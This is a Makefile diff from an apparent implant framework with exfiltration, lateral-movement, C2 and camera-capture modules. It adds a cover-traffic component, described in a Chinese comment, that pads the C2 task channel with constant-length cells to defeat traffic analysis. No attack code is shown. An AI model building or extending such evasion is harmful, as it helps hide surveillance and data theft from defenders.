@@ -26,7 +26,7 @@ LATLIB  := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
 AGOBJS  := ../agent_windows/build/linux/cam_jpeg.o \
            ../agent_windows/build/linux/cam_mock.o
 
-all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_task_resume $(BUILD)/test_link_cover
+all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_task_resume $(BUILD)/test_link_cover $(BUILD)/test_task_cover
 
 $(BUILD):
 	mkdir -p $(BUILD)
@@ -126,7 +126,21 @@ $(BUILD)/dump_task: tests/dump_task.c $(BUILD)/task.o $(BUILD)/sched.o $(P2PLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/sched.o -o $@ \
 	  $(P2PLIB) $(C2OBJS) $(LATLIB)
 
-test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover
+# 任务通道的覆盖流量维持：空闲期按预算持续吐出恒长 PAD 信元，消除
+# 「链路静默=操作员空闲」「突发一个包=刚下了命令」的观测对应。
+# PAD 走信元层、不动应用层 seq；与数据共用 cell 上下文以保证 counter 单调。
+$(BUILD)/task_cover.o: src/task_cover.c include/exfil_task_cover.h \
+                       include/exfil_task_link.h | $(BUILD)
+	$(CC) $(CFLAGS) -c $< -o $@
+
+$(BUILD)/test_task_cover: tests/test_task_cover.c $(BUILD)/task_cover.o \
+    $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o \
+    $(BUILD)/exfil.o $(BUILD)/sched.o $(P2PLIB) $(C2OBJS) $(LATLIB)
+	$(CC) $(CFLAGS) $< $(BUILD)/task_cover.o $(BUILD)/task.o \
+	  $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o \
+	  $(BUILD)/sched.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
+
+test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover
 	./$(BUILD)/test_exfil
 	./$(BUILD)/test_cam_e2e
 	./$(BUILD)/test_exfil_circuit
@@ -135,6 +149,7 @@ test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BU
 	./$(BUILD)/test_task
 	./$(BUILD)/test_task_circuit
 	./$(BUILD)/test_link_cover
+	./$(BUILD)/test_task_cover
 
 inspect: all
 	@echo "== 21_exfil 公开符号 =="
